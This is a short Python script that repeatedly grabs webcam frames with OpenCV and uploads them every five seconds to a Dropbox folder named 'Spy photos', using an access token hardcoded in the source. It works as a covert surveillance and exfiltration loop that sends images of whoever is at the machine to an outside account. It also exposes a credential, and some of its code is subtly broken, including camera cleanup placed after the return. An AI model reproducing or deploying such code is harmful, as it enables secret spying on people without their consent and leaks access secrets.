import cv2
import dropbox
import time
import random

def take_snapshot():
    number = random.randint(0,2000)
    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    while(result):
        ret,frame= videoCaptureObject.read()
        img_name = "img"+str(number)+ ".jpg"
        cv2.imwrite(img_name,frame)
        result=False
    
    return img_name 
    videoCaptureObject.release()
    cv2.destroyAllWindows()

def uploadFile(img_name):
    access_token = 'EV8Y0KarjQkAAAAAAAAAAaIy3EgHTsGWvUZJGnMGctsUsxZ25guGe3bfsnul-CD3'
    file_name = img_name
    file_from = file_name
    file_to = "/Spy photos/"+img_name
    dbx=dropbox.Dropbox(access_token)
    with open(file_from,'rb')as f:
        dbx.files_upload(f.read(),file_to,mode=dropbox.files.WriteMode.overWrite)
        print("File Uploaded")

def main():
    start_time = time.time()
    while(True):
        if((time.time()-start_time)>=5):
            start_time=time.time()
            name=take_snapshot()
            uploadFile(name)

main()
        
